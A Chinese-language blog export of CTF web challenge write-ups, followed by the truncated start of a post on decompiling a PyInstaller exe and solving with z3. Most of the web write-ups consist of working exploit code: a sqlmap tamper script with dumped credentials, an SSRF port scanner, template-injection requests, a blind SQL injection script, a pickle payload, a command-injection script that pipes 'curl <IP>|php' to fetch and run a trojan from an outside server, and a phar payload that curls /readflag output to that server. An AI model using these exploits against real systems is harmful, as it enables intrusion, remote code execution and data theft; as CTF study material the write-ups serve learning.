<p>简单来说就是 client 先要注册，然后就去提交命令，提交命令需要经过访问两次 kdc 分别拿到 TGT 和 Ticket 认证身份，然后交给 cmd_server 执行，但是 cmd 限制在以下的代码里面了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kdc/app.py</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getTicket&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Ticket_vender</span>():</span><br><span class="line">    ......</span><br><span class="line">     <span class="keyword">if</span> data[<span class="string">&#x27;username&#x27;</span>] == auth_data[<span class="number">0</span>] == username:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(time.time()) - data[<span class="string">&#x27;timestamp&#x27;</span>] &lt; <span class="number">60</span>:</span><br><span class="line">            <span class="keyword">if</span> cmd <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;cmd error&#x27;</span></span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>

<p>然后这里就很有意思，如果不进入这个时间判断，就可以执行任何命令了，而且不会报任何错误，不得了。回去 client&#x2F;app.py 看以下会有这么一段代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> res.content == <span class="string">&#x27;time error&#x27;</span>:</span><br><span class="line">    flash(<span class="string">&#x27;time error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p> 这个其实是个虚假 error，其实根本不存在 time error，所以最后的 payload 就是在访问 TGT 和 Ticket 中间 sleep(60+) 就可以了。payload： client 文件夹拿过来，把 ip 改一下，然后 app.py a加个 sleep(61)，然后就可以为所欲为了，中间代码太长，就不全放出来了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#visit TGS</span></span><br><span class="line">      cryptor = AESCipher(session[<span class="string">&#x27;session_key&#x27;</span>])</span><br><span class="line">      authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;timestamp&#x27;</span>: <span class="built_in">int</span>(time.time())&#125;))</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;sleep!!!!!!!!!!!&quot;</span>)    <span class="comment"># &lt;-------</span></span><br><span class="line">      time.sleep(<span class="number">61</span>)               <span class="comment"># &lt;-------</span></span><br><span class="line">      res = requests.post(<span class="string">&#x27;http://121.37.164.32:5001/getTicket&#x27;</span>,  data=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;cmd&#x27;</span>: cmd, <span class="string">&#x27;authenticator&#x27;</span>: base64.b64encode(authenticator), <span class="string">&#x27;TGT&#x27;</span>: session[<span class="string">&#x27;TGT&#x27;</span>]&#125;)</span><br><span class="line">      <span class="keyword">if</span> res.content == <span class="string">&#x27;time error&#x27;</span>:</span><br><span class="line">          flash(<span class="string">&#x27;time error&#x27;</span>)</span><br><span class="line">          <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h2 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h2><p>由 Y&#x3D;&#x3D;2020 猜测是 date() 协议，写一个 temper 用 sqlmap 注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line"> from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line"> __priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"> def dependencies():</span><br><span class="line">     pass</span><br><span class="line"></span><br><span class="line"> def tamper(payload, **kwargs):</span><br><span class="line">     return payload.replace(&#x27;d&#x27;, &#x27;\\d&#x27;).replace(&#x27;D&#x27;, &#x27;\\D&#x27;).replace(&#x27;j&#x27;, &#x27;\\j&#x27;).replace(&#x27;l&#x27;, &#x27;\\l&#x27;).replace(&#x27;N&#x27;, &#x27;\\N&#x27;).replace(&#x27;S&#x27;, &#x27;\\S&#x27;).replace(&#x27;w&#x27;, &#x27;\\w&#x27;).replace(&#x27;z&#x27;, &#x27;\\z&#x27;).        </span><br><span class="line"> replace(&#x27;W&#x27;, &#x27;\\W&#x27;).replace(&#x27;F&#x27;, &#x27;\\F&#x27;).replace(&#x27;m&#x27;, &#x27;\\m&#x27;).replace(&#x27;M&#x27;, &#x27;\\M&#x27;).replace(&#x27;n&#x27;, &#x27;\\n&#x27;).replace(&#x27;t&#x27;, &#x27;\\t&#x27;).replace(&#x27;L&#x27;, &#x27;\\L&#x27;).replace(&#x27;o&#x27;, &#x27;\\o&#x27;).replace(&#x27;Y&#x27;, &#x27;\\Y&#x27;).       </span><br><span class="line"> replace(&#x27;y&#x27;, &#x27;\\y&#x27;).replace(&#x27;a&#x27;, &#x27;\\a&#x27;).replace(&#x27;A&#x27;, &#x27;\\A&#x27;).replace(&#x27;B&#x27;, &#x27;\\B&#x27;).replace(&#x27;g&#x27;, &#x27;\\g&#x27;).replace(&#x27;G&#x27;, &#x27;\\G&#x27;).replace(&#x27;h&#x27;, &#x27;\\h&#x27;).replace(&#x27;H&#x27;, &#x27;\\H&#x27;).replace(&#x27;i&#x27;, &#x27;\\i&#x27;).       </span><br><span class="line"> replace(&#x27;s&#x27;, &#x27;\\s&#x27;).replace(&#x27;u&#x27;, &#x27;\\u&#x27;).replace(&#x27;e&#x27;, &#x27;\\e&#x27;).replace(&#x27;I&#x27;, &#x27;\\I&#x27;).replace(&#x27;O&#x27;, &#x27;\\O&#x27;).replace(&#x27;P&#x27;, &#x27;\\P&#x27;).replace(&#x27;T&#x27;, &#x27;\\T&#x27;).replace(&#x27;Z&#x27;, &#x27;\\Z&#x27;).replace(&#x27;c&#x27;, &#x27;\\c&#x27;).       </span><br><span class="line"> replace(&#x27;r&#x27;, &#x27;\\r&#x27;).replace(&#x27;U&#x27;, &#x27;\\U&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://121.37.181.246:6333/index.php\?time\=2020 --tamper=escapedate -D trick --dump</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[16:37:52] [INFO] used SQL query returns 1 entry</span><br><span class="line">Database: trick</span><br><span class="line">Table: admin</span><br><span class="line">[1 entry]</span><br><span class="line">+----+---------------+------------------+----------+</span><br><span class="line">| id | url           | passwd           | username |</span><br><span class="line">+----+---------------+------------------+----------+</span><br><span class="line">| 0  | /eGlhb2xldW5n | 20200202goodluck | admin    |</span><br><span class="line">+----+---------------+------------------+----------+</span><br></pre></td></tr></table></figure>

<p>首先绕过 localhost 读文件，源码有提示 eGlhb2xldW5n&#x2F;eGlhb2xldW5nLnBocA&#x3D;&#x3D;.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view-source:http://121.37.181.246:6333/eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</span><br></pre></td></tr></table></figure>

<p>根据源码知道想要得 flag，需要大写然后转为整形，最后用取反绕过就可以了，正则那里则是换行绕过，最后序列化之后扔过去。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class trick&#123;</span><br><span class="line"> public $gf;</span><br><span class="line">&#125;</span><br><span class="line">// unserialize((base64_decode($_GET[&#x27;code&#x27;])));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$filename = &quot;FLAG&quot;;</span><br><span class="line">$res = &quot;&quot;;</span><br><span class="line">for($i = 0; $i &lt; strlen($filename);$i++)&#123;</span><br><span class="line">    $res.=strval((ord($filename[$i])));</span><br><span class="line">&#125;</span><br><span class="line">$gf =  &quot;~&quot;.~$res;</span><br><span class="line">$a = new trick();</span><br><span class="line">$a-&gt;gf = $gf;</span><br><span class="line">$pass = &quot;a.passwd\n20200202&quot;;</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">echo &quot;\n&quot;.urlencode($pass);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>参考链接 <a href="https://www.php.net/manual/zh/function.sprintf">https://www.php.net/manual/zh/function.sprintf</a></p>
<p>覆盖begin获取输出，begin&#x3D;%1$s</p>
<p>head&#x3D;\ 可以取当前域</p>
<p>只剩下 http 协议，考虑扫描端口</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, Manager</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">i, results</span>):</span><br><span class="line">	url = <span class="string">&quot;http://121.37.179.47:1101/&quot;</span></span><br><span class="line">	<span class="comment"># print(&quot;[*] now &#123;&#125; &quot;.format(i))</span></span><br><span class="line">	url += <span class="string">&quot;?head=\\&amp;url=telnet://127.0.0.1:&#123;&#125;&amp;begin=%1$s&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r = requests.get(url, timeout=<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		results.append(i)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[+] find &#123;&#125; !!!&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    num = <span class="number">5</span></span><br><span class="line">    data = <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">65536</span>)</span><br><span class="line">    pool = Pool(processes=num)</span><br><span class="line">    manager = Manager()</span><br><span class="line">    results = manager.<span class="built_in">list</span>()</span><br><span class="line">    jobs = []</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        job = pool.apply_async(func, (d, results))</span><br><span class="line">        jobs.append(job)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    <span class="built_in">print</span>(results)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [80, 7496, 8080, 44590, 50301, 54448, 56332, 56333, 56334, 56335, 56336]  </span></span><br></pre></td></tr></table></figure>

<p>发现 8080 有 api，看了看接口 &#x2F;tmp&#x2F;{file}，在这里卡了很久，后来发现居然是一个模板注入…确实这里的花括号很有深意。</p>
<p>找 VIP code</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?head=\&amp;url=http://127.0.0.1:8080/read/file=&#123;file.__class__.__init__.__globals__[vip].__init__.__globals__&#125;%26vipcode=1&amp;begin=%1$s</span><br></pre></td></tr></table></figure>

<p>拿了 vip 就可以读文件，读完源码配合字符串逃逸漏洞就可以读 flag 了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?head=\&amp;url=http://127.0.0.1:8080/read/file=/&#123;vipfile.file[0]&#125;l4g_1s_h3re_u_wi11_rua/flag%26vipcode=3l0Y42BOwFQxouc1SH5ZMXTV6nhpAkWrEItmLNsPGfi9aCKz&amp;begin=%1$s</span><br></pre></td></tr></table></figure>



<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p>代码执行可以用 compress.zlib 协议绕过</p>
<p><code>compress.zlib://data:@127.0.0.1/baidu.com?,xxx</code></p>
<p>后面是4个字符的命令执行，可以用 orange 师傅的 wp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-*-coding:utf8-*-</span><br><span class="line">import requests as r</span><br><span class="line">from time import sleep</span><br><span class="line">import random</span><br><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">from urllib import quote, unquote</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">headers = &#123;&quot;Origin&quot;:&quot;http://121.36.222.22:88&quot;,&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,&quot;Cache-Control&quot;:&quot;max-age=0&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://121.36.222.22:88/core/index.php&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line">cookies = &#123;&quot;PHPSESSID&quot;:&quot;542a952605909d3a8ee9dd21b9163be7&quot;&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"># 存放待下载文件的公网主机的IP</span><br><span class="line">shell_ip = &#x27;47.115.44.232&#x27;</span><br><span class="line"> </span><br><span class="line"># 将shell_IP转换成十六进制</span><br><span class="line">ip = &#x27;0x&#x27; + &#x27;&#x27;.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split(&#x27;.&#x27;)])</span><br><span class="line"> </span><br><span class="line">url = &quot;http://121.36.222.22:88/core/&quot;</span><br><span class="line">index_url = url + &quot;index.php/&quot;</span><br><span class="line">clear_url = url + &quot;clear.php/&quot;</span><br><span class="line">sandbox = url + &quot;sandbox/8d912f274798fa6f987693329d9ac7d9/&quot;</span><br><span class="line"></span><br><span class="line"># payload某些位置的可选字符</span><br><span class="line">pos0 = random.choice(&#x27;efgh&#x27;)</span><br><span class="line">pos1 = random.choice(&#x27;hkpq&#x27;)</span><br><span class="line">pos2 = &#x27;g&#x27;  # 随意选择字符</span><br><span class="line"> </span><br><span class="line">payload = [</span><br><span class="line">    &#x27;&gt;dir&#x27;,</span><br><span class="line">    # 创建名为 dir 的文件</span><br><span class="line"> </span><br><span class="line">    &#x27;&gt;%s\&gt;&#x27; % pos0,</span><br><span class="line">    # 假设pos0选择 f , 创建名为 f&gt; 的文件</span><br><span class="line"> </span><br><span class="line">    &#x27;&gt;%st-&#x27; % pos1,</span><br><span class="line">    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span><br><span class="line">    # 因为alphabetical序中t&gt;s</span><br><span class="line"> </span><br><span class="line">    &#x27;&gt;sl&#x27;,</span><br><span class="line">    # 创建名为 &gt;sl 的文件；到此处有四个文件，</span><br><span class="line">    # ls 的结果会是：dir f&gt; kt- sl</span><br><span class="line"> </span><br><span class="line">    &#x27;*&gt;v&#x27;,</span><br><span class="line">    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span><br><span class="line">    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span><br><span class="line">    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span><br><span class="line"> </span><br><span class="line">    &#x27;&gt;rev&#x27;,</span><br><span class="line">    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span><br><span class="line"> </span><br><span class="line">    &#x27;*v&gt;%s&#x27; % pos2,</span><br><span class="line">    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。</span><br><span class="line">    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span><br><span class="line"> </span><br><span class="line">    # 续行分割 curl 0x11223344|php 并逆序写入</span><br><span class="line">    &#x27;&gt;p&#x27;,</span><br><span class="line">    &#x27;&gt;ph\\&#x27;,</span><br><span class="line">    &#x27;&gt;\|\\&#x27;,</span><br><span class="line">    &#x27;&gt;%s\\&#x27; % ip[8:10],</span><br><span class="line">    &#x27;&gt;%s\\&#x27; % ip[6:8],</span><br><span class="line">    &#x27;&gt;%s\\&#x27; % ip[4:6],</span><br><span class="line">    &#x27;&gt;%s\\&#x27; % ip[2:4],</span><br><span class="line">    &#x27;&gt;%s\\&#x27; % ip[0:2],</span><br><span class="line">    &#x27;&gt;\ \\&#x27;,</span><br><span class="line">    &#x27;&gt;rl\\&#x27;,</span><br><span class="line">    &#x27;&gt;cu\\&#x27;,</span><br><span class="line"> </span><br><span class="line">    &#x27;sh &#x27; + pos2,</span><br><span class="line">    # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span><br><span class="line">    # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span><br><span class="line">    &#x27;sh &#x27; + pos0,</span><br><span class="line">    # sh f 执行curl命令，下载文件，写入木马。</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">print payload</span><br><span class="line"></span><br><span class="line"># clear</span><br><span class="line">s = session.get(clear_url)</span><br><span class="line">print s.text</span><br><span class="line"></span><br><span class="line"># attack</span><br><span class="line">for i in payload:</span><br><span class="line">    paramsPost = &#123;&quot;url&quot;:&quot;compress.zlib://data:@127.0.0.1/baidu.com?,&#123;&#125;&quot;.format(quote(i))&#125;</span><br><span class="line">    s = session.post(url, data=paramsPost, headers=headers, cookies=cookies)</span><br><span class="line">    print &#x27;[%d]&#x27; % s.status_code, paramsPost</span><br><span class="line">    sleep(0.1)</span><br><span class="line"></span><br><span class="line"># cmd</span><br><span class="line">s = session.get(sandbox + &#x27;fun.php?cmd=whoami&#x27;)</span><br><span class="line">print &#x27;[%d]&#x27; % s.status_code, s.url</span><br><span class="line">print s.text</span><br></pre></td></tr></table></figure>



<h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><p>一个简单的布尔注入，过滤了 select 和 from，但是可以双写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pool, Manager</span><br><span class="line">import requests</span><br><span class="line">import binascii</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># database ctf-2</span><br><span class="line"># version 5.5.59-0ubuntu0.14.04.1</span><br><span class="line"># user ctf2@localhost</span><br><span class="line"># table admin,fl4g,jd,user</span><br><span class="line"># username,pwd,qq</span><br><span class="line"># flag&#123;Rogue-MySql-Server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def func(index, results):</span><br><span class="line"></span><br><span class="line">    l = 0</span><br><span class="line">    r = 127</span><br><span class="line">    m = (l+r)//2</span><br><span class="line"></span><br><span class="line">    while l&lt;r:</span><br><span class="line"></span><br><span class="line">        session = requests.Session()</span><br><span class="line">        # paramsPost = &#123;&quot;flag&quot;:&quot;1&#x27;||(ascii((mid((select database()),&#123;&#125;,1)))&gt;&#123;&#125;)\x23&quot;.format(index,m)&#125;</span><br><span class="line">        # paramsPost = &#123;&quot;flag&quot;:&quot;1&#x27;||(ascii((mid((seselectlect group_concat(column_name) frofromm information_schema.columns where table_name=&#x27;user&#x27;),&#123;&#125;,1)))&gt;&#123;&#125;)\x23&quot;.format(index,m)&#125;</span><br><span class="line">        paramsPost = &#123;&quot;flag&quot;:&quot;1&#x27;||(ascii((mid((seselectlect flag frofromm fl4g),&#123;&#125;,1)))&gt;&#123;&#125;)\x23&quot;.format(index,m)&#125;</span><br><span class="line">        # paramsPost = &#123;&quot;flag&quot;:&quot;1&#x27;||(ascii((mid((seselectlect load_file(&#x27;flag.php&#x27;)),&#123;&#125;,1)))&gt;&#123;&#125;)\x23&quot;.format(index,m)&#125;</span><br><span class="line">        cookies = &#123;&quot;PHPSESSID&quot;:&quot;l6095404o3845i84ofd6fn87r1&quot;,&quot;username&quot;:&quot;21232f297a57a5a743894a0e4a801fc3&quot;&#125;</span><br><span class="line">        </span><br><span class="line">        res = session.post(&quot;http://121.37.179.47:1001/search.php&quot;, data=paramsPost, cookies=cookies, proxies=&#123;&quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;)</span><br><span class="line">        if &#x27;no&#x27; in res.text:</span><br><span class="line">            r = m</span><br><span class="line">            m = (l+r)//2</span><br><span class="line">        else:</span><br><span class="line">            l = m + 1</span><br><span class="line">            m = (l+r)//2</span><br><span class="line"></span><br><span class="line">    print(index+1, m)</span><br><span class="line">    results[index] = m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    num = 5</span><br><span class="line">    data_num = 40</span><br><span class="line">    data = range(data_num)</span><br><span class="line">    pool = Pool(processes=num)</span><br><span class="line">    manager = Manager()</span><br><span class="line">    results = manager.list([0]*data_num)</span><br><span class="line">    jobs = []</span><br><span class="line">    for d in data:</span><br><span class="line">        job = pool.apply_async(func, (d, results))</span><br><span class="line">        jobs.append(job)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(results)</span><br><span class="line">    results = &#x27;&#x27;.join([chr(_) for _ in results])</span><br><span class="line">    print(results)</span><br></pre></td></tr></table></figure>



<h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p>phar 反序列化 + 欺骗服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Fileupload</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Listfile</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Listfile();</span><br><span class="line">$a-&gt;file = &quot;/;curl http://47.115.44.232:9001/`/readflag`;&quot;;</span><br><span class="line">$b = new Fileupload();</span><br><span class="line">$b-&gt;file = $a;</span><br><span class="line"></span><br><span class="line">$filename = &#x27;poc.phar&#x27;;</span><br><span class="line">file_exists($filename) ? unlink($filename) : null;</span><br><span class="line">$phar=new Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- rogue_mysql_server  https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py --&gt;</span><br><span class="line">&lt;!-- 记得 options 要填 8 因为 MYSQLI_OPT_LOCAL_INFILE == 8 --&gt;</span><br></pre></td></tr></table></figure>



<h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>pickle 反序列化，利用 c 标签覆盖全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import pickle</span><br><span class="line">import secret</span><br><span class="line">from flask import Flask, Response, render_template, request</span><br><span class="line"></span><br><span class="line">class Animal:</span><br><span class="line">    def __init__(self, name, category):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return f&#x27;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&#x27;</span><br><span class="line"></span><br><span class="line">    def __eq__(self, other):</span><br><span class="line">        return type(other) is Animal and self.name == other.name and self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        if module == &#x27;__main__&#x27;:</span><br><span class="line">            return getattr(sys.modules[&#x27;__main__&#x27;], name)</span><br><span class="line">        raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restricted_loads(s):</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read(filename, encoding=&#x27;utf-8&#x27;):</span><br><span class="line">    with open(filename, &#x27;r&#x27;, encoding=encoding) as fin:</span><br><span class="line">        return fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x80\x03c__main__\nsecret\n&#125;(Vname\nVrua\nVcategory\nVwww\nub0c__main__\nAnimal\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x08\x00\x00\x00categoryX\x03\x00\x00\x00wwwub.&#x27;</span><br><span class="line">pickle_data = base64.b64encode(payload)</span><br><span class="line">print(pickle_data)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    if b&#x27;R&#x27; in base64.b64decode(pickle_data):</span><br><span class="line">        print(&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">        if type(result) is not Animal:</span><br><span class="line">            print(&#x27;Are you sure that is an animal???&#x27;)</span><br><span class="line">    correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">    print(&quot;get flag!!!!&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(repr(e))</span><br><span class="line">    print(&quot;Something wrong&quot;)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Login-py反编译</title>
    <url>/2021/03/27/Login-py%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<blockquote>
<p>题目源于【羊城杯 2020】，主要考点为exe文件反编译为py文件，以及z3解方程</p>
</blockquote>
<p>记录一下Reverse中的exe反编译为py文件</p>
<span id="more"></span>

<h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p><strong>exeinfo分析</strong></p>
<p>把文件放到exeinfo看到是用py3.6版本的pyinstaller打包的</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103271842e0e47e71bcf6adb68ead.png" alt="image-20210327164113543" style="zoom: 80%;" />

<p><strong>exe-&gt;pyc</strong></p>
<blockquote>
<p>pyinstxtractor下载地址：<a href="https://github.com/countercept/python-exe-unpacker.git">https://github.com/countercept/python-exe-unpacker.git</a></p>
</blockquote>
<p>使用pyinstxtractor把exe里的pyc提取出来，py环境要尽量贴合源代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python pyinstxtractor.py attachment.exe</span><br></pre></td></tr></table></figure>

<p>找到和与题目对应的文件<code>login</code>，并添加后缀修改为<code>login.pyc</code>，因为pyinstaller在反编译时会把对应的py版本、时间戳等信息去掉，所以我们需要使用<code>010 Editor</code>或其他十六进制编辑器打开<code>login.pyc</code>和同目录下的<code>struct</code>，把<code>struct</code>的前12个字节填补到<code>login.pyc</code>前面</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210327184298387f324a69568decb6.png" alt="image-20210327165157405" style="zoom: 80%;" />



<p><strong>pyc-&gt;py</strong></p>
<blockquote>
<p>安装uncompyle6：pip install uncompyle6</p>
</blockquote>
<p>把pyc文件反编译为py文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o login.py login.pyc</span><br></pre></td></tr></table></figure>



<h3 id="z3解方程"><a href="#z3解方程" class="headerlink" title="z3解方程"></a>z3解方程</h3><p>源代码恢复如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">input1 = <span class="built_in">input</span>(<span class="string">&#x27;input something:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input1) != <span class="number">14</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong length!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    code = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">        code.append(<span class="built_in">ord</span>(input1[i]) ^ <span class="built_in">ord</span>(input1[(i + <span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line">    code.append(<span class="built_in">ord</span>(input1[<span class="number">13</span>]))</span><br><span class="line">    a1 = code[<span class="number">2</span>]</span><br><span class="line">    a2 = code[<span class="number">1</span>]</span><br><span class="line">    a3 = code[<span class="number">0</span>]</span><br><span class="line">    a4 = code[<span class="number">3</span>]</span><br><span class="line">    a5 = code[<span class="number">4</span>]</span><br><span class="line">    a6 = code[<span class="number">5</span>]</span><br><span class="line">    a7 = code[<span class="number">6</span>]</span><br><span class="line">    a8 = code[<span class="number">7</span>]</span><br><span class="line">    a9 = code[<span class="number">9</span>]</span><br><span class="line">    a10 = code[<span class="number">8</span>]</span><br><span class="line">    a11 = code[<span class="number">10</span>]</span><br><span class="line">    a12 = code[<span class="number">11</span>]</span><br><span class="line">    a13 = code[<span class="number">12</span>]</span><br><span class="line">    a14 = code[<span class="number">13</span>]</span><br><span class="line">    <span class="keyword">if</span> (a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span 